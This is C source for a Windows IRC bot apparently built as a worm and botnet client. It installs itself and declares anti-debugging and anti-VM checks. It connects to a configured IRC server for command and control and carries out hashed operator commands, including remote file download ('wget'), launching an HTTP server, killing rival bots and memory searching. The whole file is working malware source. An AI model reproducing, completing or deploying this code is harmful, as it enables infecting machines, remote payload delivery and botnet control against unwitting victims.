#include "Includes.h"
#include "externs.h"
#include "Configs.h"
/////commands//////
char *http =    "7dd4174dfbcf05fb807e8a5d1a311ae9";//httpserver
char *fdns =    "87e422ee3d049abaec8c1e0c6b2151ca";//flushdns
char *httpget = "af9d83836ecf1f49c598bcb1995b3c98";//wget
char *memfind = "5523cc35f4223ade683ab08d3869452b";//memorysearch
char *kallthread ="4226cd63ef7617f1b529be8cfb88a3d8";//dellthreads
char *kill =    "d38fa9cc14509dc569adf375e3cfa04c";//botkill
/////////////////
/* Credits to IrcWorm Coder for his codes*/

int sleeptime = 12000;

void iparse(char *commands);

SOCKET sock;

char *addrr(const char *addr)
{
topt:
struct hostent *he = NULL;

he = gethostbyname(addr);

if (he==NULL) 
{ 
	Sleep(sleeptime);
	goto topt;
}
return inet_ntoa(*(struct in_addr *) he->h_addr_list[0]);
}


int main()
{
#ifndef NO_ANTIDEBUG
	DWORD WINAPI antidebug_detectdebugger(LPVOID param);
	void antidebug_procdump();
	void antidebug_sandbox();
	bool antidebug_softice();
	bool antidebug_vm();
	bool antidebug_vm2();
	void antidebug_payload();
#endif
	
	
	InstallWorm();
	HANDLE MutexHandle;
	MutexHandle = CreateMutex(0, 0, "C_15PublicVersion");
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return(0);
	}
top:
	struct sockaddr_in addr;
	Sleep(5000);
	WSADATA WSAData;
	WSAStartup(MAKEWORD(1,0), &WSAData);
    char buffer[BUFSIZ];
	char *ptr;
    char msg[256];
	char temp[10];
	addr.sin_addr.s_addr = inet_addr(addrr(server));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(serverport);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	while(connect(sock,(struct sockaddr*)&addr,sizeof(addr)))
	{
		DnsFlushResolverCache();
		WSACleanup();
        closesocket(sock);
		goto top;
	}
	
	sprintf (buffer, "PASS %s\n", serverpass);
	send (sock, buffer, strlen (buffer), 0);
	
	sprintf (buffer, "USER %s\n", user);
	send(sock, buffer, strlen (buffer), 0);
	printf("user: %s\n",buffer);
	
	
	//random nick shit
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	unsigned long total = GetTickCount() / (1000% 86400) / 3600;
	//////////////////////////
	HANDLE hFile, FileHandle;
	hFile = CreateFile("new.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		FileHandle = CreateFile("new.txt", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if(FileHandle != INVALID_HANDLE_VALUE)
			CloseHandle(FileHandle);
		CloseHandle(FileHandle);
		sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
		send(sock, buffer, strlen (buffer), 0);
		printf("newnick: %s\n",buffer);
		sprintf (buffer, "JOIN %s\n", newchannel);
		send(sock, buffer, strlen (buffer), 0);
		printf("newjoin: %s\n",buffer);
		CloseHandle(hFile);
	} else { 
		sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
		send(sock, buffer, strlen (buffer), 0);
		printf("nick: %s\n",buffer);
		CloseHandle(hFile);
	}
	
	Sleep(500);
	
	sprintf (buffer, "JOIN %s\n", channel);
	send (sock, buffer, strlen (buffer), 0);
	printf("join: %s\n",buffer);
	
	while (1) {
		
   	    memset(buffer, '\0', BUFSIZ); 
		
		if (recv(sock, buffer, BUFSIZ-1, 0) <= 0) 
		{
			
			WSACleanup();
            closesocket(sock);
			goto top;
		} else 
			
			if (strstr(buffer, "433")) //nick in use
			{
				sprintf (msg, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
				send(sock, msg, strlen(msg), 0);
			}
			printf("%s",buffer);
			if (strstr(buffer, "PING :"))
			{
				ptr = strstr(buffer, "PING :") + strlen("PING :");
				sprintf(msg, "PONG :%s\n", ptr);
				send(sock, msg, strlen(msg), 0);
			}
			if (strstr(buffer, "404"))
			{
				
				sprintf (msg, "JOIN %s\n", channel);
				send(sock, msg, strlen(msg), 0);
			}
			
			if (strstr(buffer, "KICK"))
			{
				
				sprintf (msg, "JOIN %s\n", channel);
				send(sock, msg, strlen(msg), 0);
			}
			
			if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) 
			{
				iparse(buffer);
			}
			
	}
	WSACleanup();
    closesocket(sock);
	return 0;
	
	
}

void iparse(char *commands) {
	
	char buff[BUFSIZ];
	char *token[10];
	token[0] =strtok(commands," \r\n");
	for (int i=1;i<10;i++)
	{
		token[i]=strtok(NULL," \r\n");
	}
	
	if (strstr(token[3], "id"))
    {
		sprintf(buff,  "PRIVMSG %s :%s\n", channel, version);
        send(sock, buff, strlen(buff), 0);	
    }
	
	if (strstr(md5_str(token[3]), kill) == 0)
    {
		sprintf(buff,  "PRIVMSG %s :BotKiller Started\n", channel);
        send(sock, buff, strlen(buff), 0);
		botkiller(sock); 	/* call functions instead maybe*/
    }	
	if (strstr(md5_str(token[3]), fdns) == 0)
    {
		DnsFlushResolverCache();		
    }
	if (strstr(md5_str(token[3]), http) == 0)
	{
		sprintf(buff,  "PRIVMSG %s :Http Server Started\n", channel);
        send(sock, buff, strlen(buff), 0);
		XThread(Http_Server,NULL);
	}
	
	if (strstr(md5_str(token[3]), memfind) == 0)
    {
		sprintf(buff,  "PRIVMSG %s :Searching For String %s\n", channel,token[4]);
        send(sock, buff, strlen(buff), 0);
		//	Use Call functions MeMSearch(sock); 
	}
	if (strstr(md5_str(token[3]), httpget) == 0)
    {
		Download(token[4], token[5]);
		sprintf(buff,  "PRIVMSG %s :Wgetting\n", channel);
        send(sock, buff, strlen(buff), 0);
		
    }
    if (strstr(md5_str(token[3]), kallthread) == 0)
	{
		sprintf(buff,  "PRIVMSG %s :Threads: Deleted and cleared all threads\n", channel);
        send(sock, buff, strlen(buff), 0);
		killthreadall();
        clearthreadall();
	}
	if (strstr(token[3], "uptime"))
	{
		unsigned long total;
		unsigned long days;
		unsigned long hours;
		unsigned long minutes;
		total = GetTickCount() / 1000;
		days = total / 86400;
		hours = (total % 86400) / 3600;
		minutes = (total % 86400 % 3600) / 60;
		sprintf(buff,  "PRIVMSG %s :UPTIME/ %lud %luh %lum\n",channel, days, hours, minutes);
		send(sock, buff, strlen(buff), 0);
	}
}








